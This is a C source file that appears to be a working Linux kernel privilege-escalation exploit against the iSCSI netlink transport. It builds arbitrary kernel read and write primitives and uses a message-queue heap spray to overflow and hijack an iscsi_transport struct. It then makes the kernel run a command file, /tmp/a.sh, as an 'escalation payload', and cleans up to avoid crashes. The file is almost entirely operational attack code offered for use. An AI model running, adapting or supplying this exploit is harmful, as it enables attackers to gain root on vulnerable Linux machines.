#define _GNU_SOURCE
#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <linux/netlink.h>
#include <sched.h>
#include <stddef.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/un.h>
#include <syscall.h>
#include <unistd.h>

#include "iscsi_if.h"
#include "common.h"
#include "symbols.h"
#include "leak.h"

///////////////////////////////////////////////////////////////////////////////
// Globals ////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////

//The command to run from the usermode helper
#define COMMAND          "/tmp/a.sh"

///////////////////////////////////////////////////////////////////////////////
// Exploit code ///////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////

void set_shost(uint64_t handle, uint64_t hostno, int sock_fd, void * data, size_t len) {
	struct nlmsghdr *nlh = NULL;
	struct iscsi_uevent * ev;
	char * buffer;
	struct seq_buf * sb;
	int msg_length;

	buffer = (void *)(nlh = (struct nlmsghdr *)malloc(NLMSG_LENGTH(MSG_SIZE + len)));

	//Setup the message header
	msg_length = sizeof(struct iscsi_uevent) + len;
	memset(nlh, 0, NLMSG_LENGTH(msg_length));
	nlh->nlmsg_len = NLMSG_LENGTH(msg_length);
	nlh->nlmsg_type = ISCSI_UEVENT_SET_IFACE_PARAMS;

	//Send the set_iface_params header
	ev = (struct iscsi_uevent *)NLMSG_DATA(nlh);
	ev->type = ISCSI_UEVENT_SET_IFACE_PARAMS;
	ev->u.set_iface_params.host_no = hostno;
	ev->iferror = 0;
	ev->transport_handle = handle;

	//Setup the seq_buf that will be copied onto the Scsi_Host
	memcpy((((void *)ev) + sizeof(struct iscsi_uevent)), data, len);

	//Send the set_iface_param message to copy our fake kparam_array over the Scsi_Host
	send_netlink_msg(sock_fd, nlh);
	read_response(sock_fd, nlh);

	free(buffer);
}

void do_arbitrary_write(uint64_t handle, uint64_t hostno, int sock_fd, uint64_t address, void * data, size_t len) {

	struct nlmsghdr *nlh = NULL;
	struct iscsi_uevent * ev;
	char * buffer;
	struct seq_buf sb;
	int msg_length;

	//Copy the seq_buf over the Scsi_Host
	memset(&sb, 0, sizeof(sb));
	sb.buffer = (char *)address;
	sb.size = 0x1000;
	sb.len = 0;
	sb.readpos = 0;

	set_shost(handle, hostno, sock_fd, &sb, sizeof(sb));

	//Setup the message
	buffer = (void *)(nlh = (struct nlmsghdr *)malloc(NLMSG_LENGTH(MSG_SIZE + len)));
	msg_length = sizeof(struct iscsi_uevent) + len;
	memset(nlh, 0, NLMSG_LENGTH(msg_length));
	nlh->nlmsg_len = NLMSG_LENGTH(msg_length);
	nlh->nlmsg_type = ISCSI_UEVENT_SET_CHAP;

	//Setup the set_chap header
	ev = (struct iscsi_uevent *)NLMSG_DATA(nlh);
	ev->type = ISCSI_UEVENT_SET_CHAP;
	ev->iferror = 0;
	ev->transport_handle = handle;
	ev->u.set_path.host_no = hostno;

	memcpy((((void *)ev) + sizeof(struct iscsi_uevent)), data, len);

	//Send the set_chap message to trigger the seq_buf_putmem call
	send_netlink_msg(sock_fd, nlh);
	read_response(sock_fd, nlh);

	free(buffer);
}

void do_arbitrary_read(uint64_t handle, uint64_t hostno, int sock_fd, uint64_t address, void * data, size_t len) {

	struct nlmsghdr *nlh = NULL;
	struct iscsi_uevent * ev;
	char * buffer;
	struct seq_buf sb;
	int msg_length;
	static uint64_t user_buffer = 0;
	void * tmp;

	//Copy the seq_buf over the Scsi_Host
	memset(&sb, 0, sizeof(sb));
	sb.buffer = (char *)address;
	sb.size = 0x1000;
	sb.len = 0x1000;
	sb.readpos = 0;
	set_shost(handle, hostno, sock_fd, &sb, sizeof(sb));

	//Map the buffer in userland that we're going to read kernel memory to. Because of the parameter
	if(user_buffer == 0) { //sizes to the ping message below, it must be a buffer at a 32-bit address
		tmp = mmap((void *)0x77770000, 0x1000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0);
		if(tmp == MAP_FAILED || tmp != (void *)0x77770000) {
			printf("Could not map memory at 0x77770000 for arbitrary read\n");
			printf("Arbitrary read failed; sleeping forever to avoid corruption\n");
			SLEEP_FOREVER();
		}
		user_buffer = (uint64_t)tmp;
	}

	//Setup the message
	buffer = (void *)(nlh = (struct nlmsghdr *)malloc(NLMSG_LENGTH(MSG_SIZE)));
	msg_length = sizeof(struct iscsi_uevent);
	memset(nlh, 0, NLMSG_LENGTH(msg_length));
	nlh->nlmsg_len = NLMSG_LENGTH(msg_length);
	nlh->nlmsg_type = ISCSI_UEVENT_PING;

	//Setup the send_ping header
	ev = (struct iscsi_uevent *)NLMSG_DATA(nlh);
	ev->type = ISCSI_UEVENT_PING;
	ev->iferror = 0;
	ev->transport_handle = handle;
	ev->u.iscsi_ping.host_no = hostno;
	ev->u.iscsi_ping.iface_num = (uint32_t)user_buffer;
	ev->u.iscsi_ping.iface_type = len;

	//Send the ping message to trigger the seq_buf_to_user call
	send_netlink_msg(sock_fd, nlh);
	read_response(sock_fd, nlh);
	free(buffer);

	//Copy the memory that was written to the userland buffer into the requested buffer
	memcpy(data, (void *)user_buffer, len);
}

int remove_list_item(uint64_t handle, uint64_t hostno, int sock_fd, uint64_t target_item, uint64_t list_start) {
	uint64_t current = 0, previous = 0, next = 0, count = 0;
	uint64_t list_item = 0;

	do_arbitrary_read(handle, hostno, sock_fd, list_start, &list_item, sizeof(list_item));

	// start at front to find the item whose next points to target
	current = list_item;
	while(1) {
		if (current == 0) {
			printf("Encountered NULL in list, stopping\n");
			return -1;
		}
		do_arbitrary_read(handle, hostno, sock_fd, current, &next, sizeof(next));
		if (next == target_item) {
			//printf("Found target: next 0x%llx @%llx after %d\n", next, current, count);
			break;
		}
		current = next;
		count++;
	}
	next = current;
	count = 0;

	// start at back to find the item whose prev points to target
	current = list_item;
	while(1) {
		if (current == 0) {
			printf("Encountered NULL in list, stopping\n");
			return -1;
		}
		do_arbitrary_read(handle, hostno, sock_fd, current + 8, &previous, sizeof(previous));
		if (previous == target_item) {
			//printf("Found target: prev 0x%llx @%llx after %d\n", previous, current, count);
			break;
		}
		current = previous;
		count++;
	}
	previous = current;

	//Unlink the corrupted module
	//printf("List fixup: prev 0x%lx next 0x%lx\n", previous, next);
	do_arbitrary_write(handle, hostno, sock_fd, previous + 8, &next, sizeof(next));
	do_arbitrary_write(handle, hostno, sock_fd, next, &previous, sizeof(previous));

	return 0;
}

int cleanup_module(uint64_t handle, uint64_t hostno, int sock_fd) {
	uint64_t current = 0, previous = 0, next = 0;
	uint64_t module_kset = 0;
	uint64_t ib_iser_module;
	int retval = 0;

	//The prev/next pointer to the ib_iser module struct actually points to the list item in the module
	ib_iser_module = handle + MODULE_INFO_DIFF + MODULE_KOBJ_LIST_OFFSET;
	if (remove_list_item(handle, hostno, sock_fd, ib_iser_module, MODULE_KSET) < 0) {
		printf("Couldn't clean up MODULE_KSET\n");
		retval = -1;
	}

	ib_iser_module = handle + MODULE_INFO_DIFF + MODULE_LIST_OFFSET;
	if (remove_list_item(handle, hostno, sock_fd, ib_iser_module, MODULE_LIST_HEAD) < 0) {
		printf("Couldn't clean up MODULE_LIST_HEAD\n");
		retval = -1;
	}

	return retval;
}

void cleanup_freelist(uint64_t handle, uint64_t hostno, int sock_fd) {
	uint64_t previous = 0, next = 0;

	do_arbitrary_read(handle, hostno, sock_fd, handle + TRANSPORT_STRUCT_OFFSET, &next, sizeof(next));
	do_arbitrary_read(handle, hostno, sock_fd, handle + TRANSPORT_STRUCT_OFFSET + 8, &previous, sizeof(previous));

	//Unlink the fake freelist item
	do_arbitrary_write(handle, hostno, sock_fd, next + 8, &previous, sizeof(previous));
	do_arbitrary_write(handle, hostno, sock_fd, previous, &next, sizeof(next));
}

void cleanup(uint64_t handle, uint64_t hostno, int sock_fd) {
	// cleanup may fail, but nothing to do at that point except proceed
	cleanup_module(handle, hostno, sock_fd);
	cleanup_freelist(handle, hostno, sock_fd);
}

int run_command(uint32_t hostno, int sock_fd, uint64_t handle)
{
	struct nlmsghdr *nlh = NULL;
	struct iscsi_uevent * ev;
	char * buffer;
	struct kparam_array arr;
	int msg_length;

	//Setup the kparam_array that will be copied onto the Scsi_Host
	memset(&arr, 0, sizeof(arr));
	arr.max = 1;
	arr.elemsize = 0;
	arr.num = NULL;
	//Align the free parameter function pointer with the function address that we wrote into the handle
	arr.ops = (void *)(handle + offsetof(struct iscsi_transport, new_flashnode) - offsetof(struct kernel_param_ops, free));
	//Set the the elem item to the first argument for the function call
	arr.elem = (void *)(handle + offsetof(struct iscsi_transport, new_flashnode) + (sizeof(struct kernel_param_ops) - offsetof(struct kernel_param_ops, free)));
	set_shost(handle, hostno, sock_fd, &arr, sizeof(arr));

	//Setup the message header
	buffer = (void *)(nlh = (struct nlmsghdr *)malloc(NLMSG_LENGTH(MSG_SIZE)));
	msg_length = sizeof(struct iscsi_uevent);
	memset(nlh, 0, NLMSG_LENGTH(msg_length));
	nlh->nlmsg_len = NLMSG_LENGTH(msg_length);
	nlh->nlmsg_type = ISCSI_UEVENT_PATH_UPDATE;

	ev = (struct iscsi_uevent *)NLMSG_DATA(nlh);
	//Setup the header
	ev->type = ISCSI_UEVENT_PATH_UPDATE;
	ev->iferror = 0;
	ev->transport_handle = handle;
	ev->u.set_path.host_no = hostno;

	//Send the message to trigger the function call
	send_netlink_msg(sock_fd, nlh);

	free(buffer);
	return 0;
}

int main(int argc, char **argv) {
	int servers[NUM_CONNECTIONS];
	int fd, sock_fd;
	int i, j;
	int times = 7;
	char read_buffer[8192];
	uint32_t hostno, sid;
	uint64_t handle;
	uint64_t offset;
	uint64_t tmp = 0;
	int num_connections = NUM_CONNECTIONS;

	if(argc > 1 && !strcmp(argv[1], "-load")) {
		setup_iscsi(1, NULL, NULL, NULL, NULL);
		return 0;
	}

	if(argc > 1 && !strcmp(argv[1], "-h")) {
		printf("Usage: %s [-load] [KERNEL_BASE]\n", argv[0]);
		return 1;
	}

	bind_cpu();

	if(setup_iscsi(0, &hostno, &sid, &sock_fd, &handle)) {
		printf("Couldn't setup iscsi\n");
		return 1;
	}

	if(argc > 1) {
		tmp = strtoul(argv[1], NULL, 16);
		if(!tmp) {
			printf("Bad kernel base\n");
			return 1;
		}
		set_kernel_base(tmp, 0);
	} else {
		tmp = get_kernel_slide(hostno, sid, sock_fd, handle);
		if(tmp == -1) {
			printf("Failed to detect kernel slide\n");
			return 1;
		}
		set_kernel_base(0, tmp);
	}

	if(argc > 2) {
		num_connections = atoi(argv[2]);
		if(num_connections < 6 || num_connections > NUM_CONNECTIONS) {
			printf("Bad number of connections\n");
			return 1;
		}
	}

	for(i = 0; i < num_connections; i++) {
		servers[i] = init_msgq();
		if (servers[i] == -1) {
			fprintf(stderr, "init_msgq err\n");
			return 1;
		}
	}

#define SET_OFFSET(x)                                                                                  \
	offset = x;                                                                                          \
	if(offset > sizeof(buf_padding)) {                                                                   \
		printf("offset in buf_padding is too large; 0x%lx bytes needed, buf_padding is only 0x%lx bytes\n", \
			offset, sizeof(buf_padding)); }

	//Setup the spray buffer
	memset(buf_padding, 0, sizeof(buf_padding));

	//Set our function pointers to the transports function pointers making sure to take into account the message header
	//full of content we don't control, and the fact that we're starting our write at xmit_pdu
	SET_OFFSET(offsetof(struct iscsi_transport, set_path) - (TRANSPORT_STRUCT_OFFSET + MSG_HEADER_SIZE));
	*(uint64_t *)(buf_padding + offset) = PARAM_ARRAY_FREE;
	SET_OFFSET(offsetof(struct iscsi_transport, set_iface_param) - (TRANSPORT_STRUCT_OFFSET + MSG_HEADER_SIZE));
	*(uint64_t *)(buf_padding + offset) = MEMCPY;
	SET_OFFSET(offsetof(struct iscsi_transport, new_flashnode) - (TRANSPORT_STRUCT_OFFSET + MSG_HEADER_SIZE));
	*(uint64_t *)(buf_padding + offset) = RUN_CMD;
	SET_OFFSET(offsetof(struct iscsi_transport, new_flashnode) + sizeof(void *) - (TRANSPORT_STRUCT_OFFSET + MSG_HEADER_SIZE));
	strcpy(buf_padding + offset, COMMAND);
	SET_OFFSET(offsetof(struct iscsi_transport, set_chap) - (TRANSPORT_STRUCT_OFFSET + MSG_HEADER_SIZE));
	*(uint64_t *)(buf_padding + offset) = SEQ_BUF_PUTMEM;
	SET_OFFSET(offsetof(struct iscsi_transport, send_ping) - (TRANSPORT_STRUCT_OFFSET + MSG_HEADER_SIZE));
	*(uint64_t *)(buf_padding + offset) = SEQ_BUF_TO_USER;

	//After the transport struct is a module struct for the ib_iser module. We need to fix a few fields so that
	//the try_module_get call doesn't fail and iterating over the modules doesn't crash.
	SET_OFFSET(MODULE_INFO_DIFF + MODULE_STATUS_OFFSET - (TRANSPORT_STRUCT_OFFSET + MSG_HEADER_SIZE));
	*(uint64_t *)(buf_padding + offset) = 0x0; //MODULE_STATE_LIVE
	SET_OFFSET(MODULE_INFO_DIFF + MODULE_REFCNT_OFFSET - (TRANSPORT_STRUCT_OFFSET + MSG_HEADER_SIZE));
	*(uint64_t *)(buf_padding + offset) = 0x55; // Anything greater than 0 will do

	printf("Setting up target heap buffer\n");
	setup_overflow(hostno, sock_fd, handle);

	//printf("Sending messages (buf=%p)\n", buf_padding);
	for(i = 0; i < num_connections-5; i++) {
		for(j = 0; j < times; j++) {
			if(msgq_send(servers[i], buf_padding, sizeof(buf_padding)) < 0) {
				printf("Couldn't send message %d (msgq %d) to server: %s (errno %d)\n", i, servers[i], strerror(errno), errno);
				break;
			}
		}
	}

	for(i = 0; i < num_connections - 5; i++)
		msgq_recv(servers[i]);

	//Trigger the overflow, changing the freepointer
	printf("Triggering overflow\n");
	fd = iscsi_get_file(hostno);
	read(fd, read_buffer, 4096+16);

	//Allocate the next free item, causing the transport struct to change
	printf("Allocating controlled objects for R/W\n");
	for(i = num_connections-5; i < num_connections; i++) {
		for(j = 0; j < times; j++) {
			if(msgq_send(servers[i], buf_padding, sizeof(buf_padding)) < 0) {
				printf("Couldn't send message %d to server\n", num_connections-1);
				break;
			}
		}
	}

	sleep(2);

	//Check to see if the exploit is working by reading from the transport struct
	do_arbitrary_read(handle, hostno, sock_fd, handle, &tmp, sizeof(tmp));
	if(tmp != handle + MODULE_INFO_DIFF) {
		printf("Failed to overwrite iscsi_transport struct (read 0x%lx)\n", tmp);
		return 1;
	}

	//Cleanup after the exploit
	printf("Cleaning up\n");
	cleanup(handle, hostno, sock_fd);

	printf("Running escalation payload\n");
	run_command(hostno, sock_fd, handle);
	printf("Success\n");

	//Cleanup to prevent future kernel panics
	tmp = 2; //MODULE_STATE_GOING
	do_arbitrary_write(handle, hostno, sock_fd, handle + MODULE_INFO_DIFF + MODULE_STATUS_OFFSET, &tmp, sizeof(tmp));

	return 0;
}

